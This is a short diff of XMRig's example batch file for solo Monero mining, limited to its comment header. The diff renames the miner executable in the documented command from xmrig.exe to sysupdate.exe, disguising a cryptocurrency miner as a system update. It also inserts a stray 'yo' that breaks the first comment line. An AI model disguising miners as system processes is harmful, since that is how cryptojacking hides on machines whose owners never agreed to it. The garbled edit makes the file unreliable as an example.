@@ -1,7 +1,7 @@
-:: Example batch file for mining Monero solo
+yo:: Example batch file for mining Monero solo
 ::
 :: Format:
-::	xmrig.exe -o <node address>:<node port> -a rx/0 -u <wallet address> --daemon
+::	sysupdate.exe -o <node address>:<node port> -a rx/0 -u <wallet address> --daemon
 ::
 :: Fields:
 ::	node address		The host name of your monerod node or its IP address. It can also be a public node with RPC enabled, for example node.xmr.to
